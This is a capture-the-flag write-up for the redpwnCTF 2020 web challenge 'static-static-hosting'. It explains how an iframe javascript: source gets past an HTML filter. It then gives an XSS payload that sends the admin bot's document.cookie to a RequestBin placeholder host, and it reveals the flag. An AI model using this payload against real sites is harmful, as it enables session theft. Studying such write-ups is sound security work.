---
layout: post
title: "static-static-hosting"
author: "shreyas-sriram"
---

Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me here.

`https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting` (aadmin-bot)

Site: `static-static-hosting.2020.redpwnc.tf`

Note: The site is entirely static. Dirbuster will not be useful in solving it.

# Solution

* The input is getting reflected in the next page, this could be a case of **XSS**
* But trying `<script>alert('1')</script>` as payload doesn't execute **XSS**
* Looking through the source code, it is clear that there is some kind of filtering for `<script>` and only certain attributes like `src, width, height, alt, class` can be used
* This is one of the payloads that works<br/>
` <iframe src="javascript:alert(1)"> `
* There is an admit-bot in the question which will visit the URL provided, this can be exploited to steal the admin's cookie
* Setup a [RequestBinURL](https://requestbin.com)
* Use the following payload in the static-pastebin<br/>
` <iframe src="javascript:var img = new Image(0,0); img.src='http://<RequestBinURL>/image.php?c=' + document.cookie; document.body.appendChild(img);"></iframe> `
* Copy the URL and submit to the admin-bot\
URL  :  ` https://static-static-hosting.2020.redpwnc.tf/site/#<Base64-payload> `
* View the logs on the **RequestBinURL** to obtain the flag
` flag{wh0_n33d5_d0mpur1fy} `